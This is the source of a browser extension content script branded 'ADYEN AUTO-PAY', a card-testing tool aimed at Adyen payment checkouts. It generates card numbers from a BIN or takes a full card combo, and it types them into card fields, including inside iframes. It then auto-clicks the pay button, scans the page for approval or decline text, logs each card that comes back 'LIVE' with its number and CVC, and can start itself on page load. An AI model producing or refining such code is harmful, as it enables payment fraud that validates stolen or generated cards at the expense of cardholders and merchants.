"use strict";

(function () {
  const cfgKey = "adyenPayload";
  const frameId = "f" + Math.random().toString(36).slice(2, 9);
  const isTop = window.self === window.top;
  let running = false;
  let stopRequested = false;
  let tries = 0;
  let liveHits = 0;
  let currentTick = "";
  let pendingCard = null;

  function getConfig() {
    return new Promise((resolve) => {
      chrome.storage.local.get([cfgKey], (res) => {
        resolve(res[cfgKey] || null);
      });
    });
  }

  function setConfig(cfg) {
    return new Promise((resolve) => {
      chrome.storage.local.set({ [cfgKey]: cfg }, resolve);
    });
  }

  function setNativeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : el instanceof HTMLSelectElement
        ? HTMLSelectElement.prototype
        : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, "value");
    if (!desc) return;
    desc.set.call(el, value);
    el.dispatchEvent(new Event("input", { bubbles: true }));
    el.dispatchEvent(new Event("change", { bubbles: true }));
    el.dispatchEvent(new Event("blur", { bubbles: true }));
  }

  function typeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, "value");
    if (!desc) return;
    desc.set.call(el, "");
    el.dispatchEvent(new Event("input", { bubbles: true }));
    const str = String(value);
    for (let i = 0; i < str.length; i++) {
      const ch = str[i];
      desc.set.call(el, el.value + ch);
      try {
        el.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, cancelable: true, key: ch }));
        el.dispatchEvent(new KeyboardEvent("keypress", { bubbles: true, cancelable: true, key: ch }));
        el.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true, cancelable: true, key: ch }));
      } catch (e) {}
      el.dispatchEvent(new Event("input", { bubbles: true }));
    }
    el.dispatchEvent(new Event("change", { bubbles: true }));
    el.dispatchEvent(new Event("blur", { bubbles: true }));
  }

  function classifyField(el) {
    const s = ((el.id || "") + " " + (el.name || "") + " " +
      (el.getAttribute("aria-label") || "") + " " +
      (el.getAttribute("data-fieldtype") || "") + " " +
      (el.getAttribute("autocomplete") || "") + " " +
      (typeof el.className === "string" ? el.className : "")).toLowerCase();
    if (/(card\s*[-_ ]*number|ccnum|cc[-_ ]number|\bpan\b|encrypted\w*(number|pan))/.test(s)) return "number";
    if (/(expiry|expiration)[-_ ]*(month)?|encrypted\w*month|expmonth/.test(s) && !/year/.test(s)) return "month";
    if (/(expiry|expiration)[-_ ]*year|encrypted\w*year|expyear/.test(s) || (/exp/.test(s) && /year/.test(s))) return "year";
    if (/(cvc|cvv|csc|security)[-_ ]*(code)?/.test(s)) return "cvc";
    return null;
  }

  function fillOwned(card) {
    const fields = { number: false, month: false, year: false, cvc: false };
    let any = false;

    const inputs = Array.from(document.querySelectorAll("input"));
    for (const inp of inputs) {
      if (inp.type === "hidden") continue;
      const kind = classifyField(inp);
      if (!kind) continue;
      if (kind === "number" && !fields.number) {
        typeValue(inp, card.number || "");
        fields.number = true; any = true;
      } else if (kind === "month" && !fields.month) {
        typeValue(inp, String(card.month || card.expiryMonth || "12").padStart(2, "0"));
        fields.month = true; any = true;
      } else if (kind === "year" && !fields.year) {
        typeValue(inp, String(card.year || card.expiryYear || "2029").slice(-2));
        fields.year = true; any = true;
      } else if (kind === "cvc" && !fields.cvc) {
        typeValue(inp, card.cvc || "");
        fields.cvc = true; any = true;
      }
    }

    if (!fields.number) {
      const n = document.querySelector('input[autocomplete="cc-number"], input[name*="cardNumber"], input[id*="cardNumber"]');
      if (n) { typeValue(n, card.number || ""); fields.number = true; any = true; }
    }
    if (!fields.month && !fields.year) {
      const e = document.querySelector('input[autocomplete="cc-exp"], input[name*="expiry"], input[id*="expiry"]');
      if (e) {
        typeValue(e, String(card.month || card.expiryMonth || "12").padStart(2, "0") + "/" +
          String(card.year || card.expiryYear || "2029").slice(-2));
        fields.month = true; fields.year = true; any = true;
      }
    }
    if (!fields.cvc) {
      const c = document.querySelector('input[autocomplete="cc-csc"], input[name*="securityCode"], input[name*="cvc"]');
      if (c) { typeValue(c, card.cvc || ""); fields.cvc = true; any = true; }
    }

    const holder = document.querySelector('input[name*="holder"], input[id*="holder"], input[autocomplete="cc-name"]');
    if (holder) setNativeValue(holder, card.holder || "JOHN DOE");

    const email = document.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
    const maybeEmail = card.holder && /@/.test(card.holder) ? card.holder : (card.email || "");
    if (email && maybeEmail) setNativeValue(email, maybeEmail);

    return { fields, any };
  }

  function frameReportKey(pref, id) {
    return pref + "_" + id;
  }

  function report(pref, obj) {
    chrome.storage.local.set({ [frameReportKey(pref, frameId)]: obj });
  }

  function clearReports(pref) {
    chrome.storage.local.get(null, (all) => {
      const toDel = Object.keys(all).filter((k) => k.indexOf(pref) === 0);
      if (toDel.length) chrome.storage.local.remove(toDel);
    });
  }

  function summarize(pref) {
    return new Promise((resolve) => {
      chrome.storage.local.get(null, (all) => {
        const agg = { number: false, month: false, year: false, cvc: false, any: false, frames: 0, texts: [] };
        Object.keys(all).forEach((k) => {
          if (k.indexOf(pref) !== 0) return;
          const r = all[k];
          if (!r || r.tick === undefined || r.tick !== currentTick) return;
          agg.frames++;
          if (r.fields) {
            ["number", "month", "year", "cvc"].forEach((f) => {
              if (r.fields[f]) agg[f] = true;
            });
            if (r.any) agg.any = true;
          }
          if (r.text) agg.texts.push(r.text);
        });
        resolve(agg);
      });
    });
  }

  function sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  async function waitReports(pref, minWait, maxWait) {
    const start = Date.now();
    let lastCount = -1;
    let lastChange = Date.now();
    await sleep(700);
    while (Date.now() - start < (maxWait || 7000)) {
      const s = await summarize(pref);
      if (s.frames > 0 && s.frames !== lastCount) {
        lastCount = s.frames;
        lastChange = Date.now();
      }
      if (s.frames > 0 && Date.now() - lastChange > 550) return s;
      if (Date.now() - start >= (minWait || 1800) && s.frames > 0) return s;
      await sleep(250);
    }
    return summarize(pref);
  }

  function execFill(card) {
    return new Promise((resolve) => {
      try {
        chrome.runtime.sendMessage({ action: "FF_EXEC", card: card }, (res) => {
          if (chrome.runtime.lastError || !res) {
            resolve({ any: false, fields: {}, error: chrome.runtime.lastError && chrome.runtime.lastError.message });
            return;
          }
          resolve(res);
        });
      } catch (e) {
        resolve({ any: false, fields: {}, error: String(e) });
      }
    });
  }

  chrome.storage.onChanged.addListener((changes, area) => {
    if (area !== "local") return;

    const ff = changes["nono_ff"];
    if (ff && ff.newValue && ff.newValue.card) {
      currentTick = ff.newValue.tick;
      pendingCard = ff.newValue.card;
      const r = fillOwned(pendingCard);
      report("nono_ff", { tick: ff.newValue.tick, fields: r.fields, any: r.any });
      return;
    }

    const dt = changes["nono_detect"];
    if (dt && dt.newValue) {
      currentTick = dt.newValue.tick;
      const text = document.body ? document.body.innerText.slice(0, 4000) : "";
      report("nono_dt", { tick: dt.newValue.tick, text: text });
      return;
    }

    const dbg = changes["nono_dbg"];
    if (dbg && dbg.newValue) {
      currentTick = dbg.newValue.tick;
      const inputs = Array.from(document.querySelectorAll("input")).map((i) => ({
        t: i.type, n: i.name || "", id: i.id || "",
        al: i.getAttribute("aria-label") || "",
        ac: i.getAttribute("autocomplete") || "",
        ft: i.getAttribute("data-fieldtype") || "",
        cls: (i.className || "").slice(0, 40),
        vis: !!(i.offsetWidth || i.offsetHeight)
      }));
      const txt = JSON.stringify({ url: location.href.slice(0, 140), inputs: inputs, total: document.querySelectorAll("input").length }).slice(0, 3000);
      report("nono_dbg", { tick: dbg.newValue.tick, text: txt });
    }
  });

  const observer = new MutationObserver(() => {
    if (!pendingCard) return;
    const r = fillOwned(pendingCard);
    report("nono_ff", { tick: currentTick, fields: r.fields, any: r.any });
  });
  observer.observe(document.documentElement || document, {
    childList: true, subtree: true
  });

  function ensureCardMethod() {
    const methods = Array.from(document.querySelectorAll(
      '.adyen-checkout__payment-method, [data-testid*="payment-method"], [class*="payment-method"]'
    ));
    for (const m of methods) {
      const txt = (m.innerText || "").toLowerCase();
      if (/card|credit|debit/.test(txt)) {
        m.click();
        return true;
      }
    }
    const btns = Array.from(document.querySelectorAll("button, label, div[role='button']"));
    for (const b of btns) {
      const t = (b.innerText || "").replace(/\s+/g, " ").trim().toLowerCase();
      if (/^(credit|debit)?\s*(card|pay by card)$/.test(t) && b.offsetParent) {
        b.click();
        return true;
      }
    }
    return false;
  }

  function findPayButton() {
    const buttons = Array.from(document.querySelectorAll(
      "button, [role='button'], a, input[type='submit'], input[type='button']"
    ));
    let adyenBtn = null;
    for (const b of buttons) {
      const rect = b.getBoundingClientRect();
      if (rect.width === 0 && rect.height === 0) continue;
      const text = ((b.innerText || "") + " " + (b.getAttribute("aria-label") || "")).trim().toLowerCase();
      if (/adyen-checkout__button/.test(b.className || "")) {
        adyenBtn = adyenBtn || b;
      }
      if (/^(pay|pay now|pay \$?\d|proceed to pay|confirm|submit|place order)/i.test(text)) {
        return b;
      }
      if (/pay/i.test(text) && text.length < 40 && b.offsetParent) {
        adyenBtn = adyenBtn || b;
      }
    }
    if (adyenBtn && !adyenBtn.disabled) return adyenBtn;
    return adyenBtn;
  }

  function isProcessing() {
    const html = topDocHtml();
    if (/adyen-checkout__spinner|adyen-checkout__status--processing|adyen-checkout__status__icon--processing/i.test(html)) return true;
    const btn = findPayButton();
    if (!btn) return false;
    const t = ((btn.innerText || "") + " " + (btn.getAttribute("aria-label") || "")).toLowerCase();
    return btn.disabled || /processing|please wait|waiting/i.test(t);
  }

  async function submitClick(retries) {
    retries = retries == null ? 8 : retries;
    for (let i = 0; i < retries; i++) {
      const btn = findPayButton();
      if (btn) {
        try {
          btn.scrollIntoView({ block: "center" });
        } catch (e) {}
        btn.click();
      }
      await sleep(1300);
      if (isProcessing()) return true;
      const liBtn = findPayButton();
      if (liBtn && liBtn.disabled === false && i < 2) {
        await sleep(800);
        continue;
      }
    }
    return false;
  }

  function topDocText() {
    return document.body ? (document.body.innerText || "").toLowerCase() : "";
  }

  function topDocHtml() {
    return document.documentElement ? document.documentElement.innerHTML : "";
  }

  function detectResult(texts) {
    const all = (topDocText() + " " + texts.join(" ")).toLowerCase();
    const html = topDocHtml();

    if (/adyen-checkout__threeds2|threeds2|3d-secure|\b3ds\b|threeds|challenge/.test(html)) {
      return { ok: true, label: "3DS CHALLENGE" };
    }
    const good = [
      "thank you", "payment successful", "payment complete", "approved",
      "processing", "redirecting", "almost done", "your payment was made",
      "payment succeeded", "success", "payment received"
    ];
    for (const g of good) {
      if (all.includes(g)) return { ok: true, label: "PROCESSED" };
    }
    const bad = [
      "declined", "refused", "invalid card number", "unsupported card", "expired",
      "not supported", "no sufficient", "insufficient", "invalid number",
      "cannot be used", "rejected", "failed", "do not honor",
      "card number is invalid", "security code is incorrect", "card expired",
      "payment not successful", "please try again"
    ];
    for (const b of bad) {
      if (all.includes(b)) return { ok: false, label: b.toUpperCase() };
    }
    return null;
  }

  function buildPanel() {
    if (document.getElementById("nono-panel")) return;

    const panel = document.createElement("div");
    panel.id = "nono-panel";
    panel.style.cssText = [
      "position:fixed", "top:10px", "right:10px", "z-index:2147483647",
      "width:min(320px, calc(100vw - 20px))", "background:#0b0e13",
      "color:#e6e6e6", "font-family:Segoe UI, Roboto, sans-serif",
      "border:1px solid #1f2a33", "border-radius:14px", "padding:0",
      "box-shadow:0 12px 40px rgba(0,0,0,.65)", "font-size:12px",
      "user-select:none", "overflow:hidden", "transition:transform .28s ease,opacity .28s ease",
      "opacity:0", "transform:translateX(40px)", "max-height:calc(100vh - 20px)",
      "display:flex", "flex-direction:column"
    ].join(";");

    panel.innerHTML = `
      <div style="background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;padding:10px 12px;display:flex;justify-content:space-between;align-items:center">
        <div style="display:flex;align-items:center;gap:8px">
          <span style="font-size:16px">&#9889;</span>
          <b style="font-size:13px;letter-spacing:.5px">ADYEN AUTO-PAY</b>
          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.4</span>
        </div>
        <div style="display:flex;gap:6px">
          <button id="nono-dbg" title="Debug DOM" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
          <button id="nono-min" title="Minimize" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:12px;line-height:1">&#8211;</button>
        </div>
      </div>

      <div style="padding:12px;display:flex;flex-direction:column;gap:6px">
        <div style="display:flex;gap:6px">
          <div style="flex:1">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Custom BIN</label>
            <input id="nono-bin" type="text" placeholder="4400661989645" maxlength="19" inputmode="numeric"
              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
          </div>
          <div style="width:88px">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Card Len</label>
            <select id="nono-len" style="width:100%;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
              <option value="16">16</option>
              <option value="15">15</option>
              <option value="19">19</option>
            </select>
          </div>
        </div>

        <div style="display:flex;gap:6px;align-items:flex-end">
          <div style="flex:1">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Or Full Combo</label>
            <input id="nono-combo" type="text" placeholder="number|mm|yyyy|cvc" inputmode="numeric"
              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
          </div>
          <div style="width:88px">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Holder</label>
            <input id="nono-holder" type="text" placeholder="JOHN DOE" style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
          </div>
        </div>

        <div style="display:flex;gap:6px;align-items:center;font-size:11px;margin-top:2px">
          <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
            <input type="checkbox" id="nono-autosubmit" style="width:auto;accent-color:#00d1b2"> Auto Submit
          </label>
          <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
            <input type="checkbox" id="nono-autoonload" style="width:auto;accent-color:#00d1b2"> Auto on Load
          </label>
        </div>

        <div style="display:flex;gap:6px;margin-top:4px">
          <button id="nono-start" style="flex:2;padding:11px;background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;border:none;border-radius:9px;font-weight:700;font-size:13px;cursor:pointer">&#9654; START HIT</button>
          <button id="nono-stop" style="flex:1;padding:11px;background:#23303c;color:#e6e6e6;border:none;border-radius:9px;font-weight:600;font-size:12px;cursor:pointer">STOP</button>
        </div>

        <div style="display:flex;justify-content:space-between;font-size:11px;margin-top:2px">
          <span style="color:#00d1b2" id="nono-log">Ready, Chief.</span>
          <span style="color:#ffcc00" id="nono-count">Live: 0</span>
        </div>

        <div id="nono-results" style="max-height:150px;overflow-y:auto;font-size:11px;border-top:1px solid #1a2430;padding-top:6px"></div>

        <div style="display:flex;justify-content:flex-end">
          <button id="nono-close" style="background:none;border:none;color:#5a6b7c;cursor:pointer;font-size:11px;padding:2px 6px;border-radius:6px">Remove</button>
        </div>
      </div>
    `;

    document.body.appendChild(panel);

    const pill = document.createElement("div");
    pill.id = "nono-pill";
    pill.style.cssText = [
      "position:fixed", "right:10px", "top:30%", "z-index:2147483647",
      "width:48px", "height:48px", "border-radius:14px",
      "background:linear-gradient(135deg,#00d1b2,#00a88c)", "color:#00110d",
      "display:none", "align-items:center", "justify-content:center",
      "font-size:20px", "cursor:pointer", "box-shadow:0 6px 20px rgba(0,0,0,.5)",
      "touch-action:none", "user-select:none", "flex-direction:column", "gap:0"
    ].join(";");
    pill.innerHTML = '<span style="line-height:1">&#9889;</span><span id="nono-pill-count" style="font-size:8px;font-weight:700;line-height:1">0</span>';
    document.body.appendChild(pill);

    const box = panel.querySelector("#nono-results");
    const log = panel.querySelector("#nono-log");
    const count = panel.querySelector("#nono-count");
    const pillCount = document.getElementById("nono-pill-count");

    setTimeout(() => {
      panel.style.opacity = "1";
      panel.style.transform = "translateX(0)";
    }, 40);

    function minimize() {
      panel.style.transform = "translateX(40px)";
      panel.style.opacity = "0";
      setTimeout(() => {
        panel.style.display = "none";
        pill.style.display = "flex";
      }, 280);
    }

    function restore() {
      pill.style.display = "none";
      panel.style.display = "flex";
      requestAnimationFrame(() => {
        panel.style.opacity = "1";
        panel.style.transform = "translateX(0)";
      });
    }

    let dragY = 0;
    let dragging = false;
    pill.addEventListener("pointerdown", (e) => {
      dragging = true;
      dragY = e.clientY - pill.offsetTop;
      pill.setPointerCapture(e.pointerId);
    });
    pill.addEventListener("pointermove", (e) => {
      if (!dragging) return;
      const y = e.clientY - dragY;
      const maxY = window.innerHeight - 56;
      pill.style.top = Math.min(Math.max(8, y), maxY) + "px";
    });
    pill.addEventListener("pointerup", (e) => {
      dragging = false;
      if (pill.hasPointerCapture && pill.hasPointerCapture(e.pointerId)) pill.releasePointerCapture(e.pointerId);
    });
    pill.addEventListener("click", () => {
      if (dragging) return;
      restore();
    });

    const el = (id) => panel.querySelector(id);

    function savePanelState() {
      const cfg = {
        bin: el("#nono-bin").value.trim(),
        combo: el("#nono-combo").value.trim(),
        holder: el("#nono-holder").value.trim(),
        cardLength: parseInt(el("#nono-len").value, 10) || 16,
        autoSubmit: el("#nono-autosubmit").checked,
        autoOnLoad: el("#nono-autoonload").checked,
        enabled: true
      };
      setConfig(cfg);
      return cfg;
    }

    function logMsg(m) { log.textContent = m; }
    function updateCount() {
      count.textContent = "Live: " + liveHits + " / " + tries;
      pillCount.textContent = String(liveHits);
    }
    function logResult(icon, text, color, mono) {
      const line = document.createElement("div");
      line.style.cssText = "padding:3px 0;border-bottom:1px solid #141c26;color:" + (mono ? "#e6e6e6" : color) + ";white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:flex;gap:4px;align-items:center";
      line.innerHTML = '<span style="flex-shrink:0">' + icon + '</span><span style="overflow:hidden;text-overflow:ellipsis">' + text + '</span>';
      box.prepend(line);
      while (box.children.length > 12) box.lastChild.remove();
    }

    async function debugDump() {
      logMsg("Gathering frame inventory...");
      const tick = Date.now() + Math.floor(Math.random() * 1000);
      currentTick = tick;
      clearReports("nono_dbg");
      chrome.storage.local.set({ nono_dbg: { tick: tick } });
      await sleep(1400);
      const s = await summarize("nono_dbg");

      const iframes = Array.from(document.querySelectorAll("iframe")).map((f) => ({
        src: (f.src || "").slice(0, 130), title: f.title || "", w: f.offsetWidth, h: f.offsetHeight
      }));
      let out = "URL:" + location.href + " | iframes:" + iframes.length + " " + JSON.stringify(iframes) +
        " | inputs:" + document.querySelectorAll("input").length;
      s.texts.forEach((t, i) => { out += "\n---FRAME " + (i + 1) + "---" + t; });
      if (!s.texts.length) out += "\n(no frame handlers answered)";

      const line = document.createElement("div");
      line.style.cssText = "padding:3px 0;border-bottom:1px dashed #1a2430;color:#9be;font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:250px;overflow:auto";
      line.textContent = out;
      box.prepend(line);
      logMsg("Debug dump ready. Read the top entry.");
    }

    el("#nono-min").addEventListener("click", minimize);
    el("#nono-dbg").addEventListener("click", debugDump);
    el("#nono-close").addEventListener("click", () => {
      panel.style.opacity = "0";
      setTimeout(() => panel.remove(), 200);
    });
    el("#nono-bin").addEventListener("input", savePanelState);
    el("#nono-combo").addEventListener("input", savePanelState);
    el("#nono-holder").addEventListener("input", savePanelState);
    el("#nono-len").addEventListener("change", savePanelState);
    el("#nono-autosubmit").addEventListener("change", savePanelState);
    el("#nono-autoonload").addEventListener("change", savePanelState);

    el("#nono-start").addEventListener("click", startHit);
    el("#nono-stop").addEventListener("click", () => {
      stopRequested = true;
      logMsg("Stopped by Chief.");
    });

    function startHit() {
      const bin = el("#nono-bin").value.trim();
      const combo = el("#nono-combo").value.trim();
      if (!bin && !combo) {
        logMsg("Give me a BIN or combo first, Chief.");
        return;
      }
      savePanelState();
      stopRequested = false;
      tries = 0;
      liveHits = 0;
      updateCount();
      box.innerHTML = "";
      logMsg("Hitting...");
      runHits();
    }

    window.__nonoLog = logMsg;
    window.__nonoUpdate = updateCount;
    window.__nonoResult = logResult;
    window.__nonoRestore = restore;
  }

  function parseCombo(combo) {
    const parts = combo.split("|").map((s) => s.trim());
    return { number: (parts[0] || "").replace(/\s/g, ""), month: parts[1] || "", year: parts[2] || "", cvc: parts[3] || "" };
  }

  async function fillRound(card) {
    let got = { any: false, fields: {} };
    try {
      const res = await execFill(card);
      if (res && !res.error && res.any) got = { any: true, fields: res.fields || {} };
    } catch (e) {}
    const tick = Date.now() + Math.floor(Math.random() * 1000);
    currentTick = tick;
    clearReports("nono_ff");
    chrome.storage.local.set({ nono_ff: { card: card, tick: tick } });
    const st = await waitReports("nono_ff", 1500, 6000);
    return { exec: got, storage: st, any: got.any || st.any };
  }

  async function runHits() {
    const cfg = await getConfig();
    if (!cfg) return;
    running = true;
    window.__nonoLog && window.__nonoLog("Running...");

    while (!stopRequested && running) {
      let card;
      if (cfg.combo) {
        const p = parseCombo(cfg.combo);
        card = { number: p.number, month: p.month, year: p.year, cvc: p.cvc, holder: cfg.holder || "JOHN DOE" };
      } else {
        card = window.CardGen.genCard(cfg.bin.replace(/\s/g, ""), { length: cfg.cardLength || 16 });
        card.holder = cfg.holder || "JOHN DOE";
        card.month = card.expiryMonth;
        card.year = card.expiryYear;
      }
      pendingCard = card;

      tries++;
      window.__nonoUpdate && window.__nonoUpdate();
      window.__nonoLog && window.__nonoLog("Try #" + tries + " -> " + card.number);

      let st = { any: false };
      for (let round = 0; round < 3 && !stopRequested; round++) {
        ensureCardMethod();
        await sleep(500);
        st = await fillRound(card);
        if (st.any) break;
        window.__nonoLog && window.__nonoLog("No fields yet, round " + (round + 1) + "/3...");
        await sleep(2200);
      }

      let submitted = false;
      if (cfg.autoSubmit && st.any) {
        submitted = await submitClick();
        if (!submitted) {
          window.__nonoLog && window.__nonoLog("Pay click failed, re-filling fields...");
          st = await fillRound(card);
          await sleep(900);
          submitted = await submitClick();
        }
      }

      const dtTick = Date.now() + Math.floor(Math.random() * 1000);
      currentTick = dtTick;
      clearReports("nono_dt");
      chrome.storage.local.set({ nono_detect: { tick: dtTick } });
      const dt = await waitReports("nono_dt", 1200, 5000);

      let res = detectResult(dt.texts);
      if (!res) {
        if (!st.any) res = { ok: false, label: "FIELDS NOT FOUND" };
        else if (!submitted) res = { ok: false, label: "PAY BUTTON MISSED" };
        else res = { ok: false, label: "NO VISIBLE RESULT" };
      }

      window.__nonoUpdate && window.__nonoUpdate();

      if (res.ok) {
        liveHits++;
        window.__nonoUpdate && window.__nonoUpdate();
        window.__nonoResult && window.__nonoResult("&#11088;",
          "LIVE #" + liveHits + "  " + card.number + " " + card.month + "/" + card.year.slice(-2) +
          " " + card.cvc + " -> " + res.label, "#00d1b2");
        window.__nonoLog && window.__nonoLog("LIVE HIT! " + res.label + ". Stopping.");
        stopRequested = true;
      } else {
        window.__nonoResult && window.__nonoResult("&#10060;",
          "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
          " " + card.cvc + " -> " + res.label, "#ff5d5d");
        if (tries >= 30) {
          window.__nonoLog && window.__nonoLog("30 dead tries. Stopping.");
          stopRequested = true;
        }
      }

      await sleep(cfg.autoSubmit ? 2000 : 800);
    }

    running = false;
    window.__nonoLog && window.__nonoLog("Cycle stopped.");
  }

  async function init() {
    if (!isTop) return;
    buildPanel();
    const cfg = await getConfig();
    if (cfg) {
      const ids = ["nono-bin", "nono-combo", "nono-holder", "nono-len", "nono-autosubmit", "nono-autoonload"];
      const vals = [cfg.bin || "", cfg.combo || "", cfg.holder || "", String(cfg.cardLength || 16), !!cfg.autoSubmit, !!cfg.autoOnLoad];
      ids.forEach((id, i) => {
        const e = document.getElementById(id);
        if (e) {
          if (e.type === "checkbox") e.checked = vals[i];
          else e.value = vals[i];
        }
      });
      if (cfg.enabled && cfg.autoOnLoad) {
        setTimeout(() => {
          const b = document.getElementById("nono-start");
          if (b) b.click();
        }, 1800);
      }
    }
  }

  setTimeout(init, 700);
})();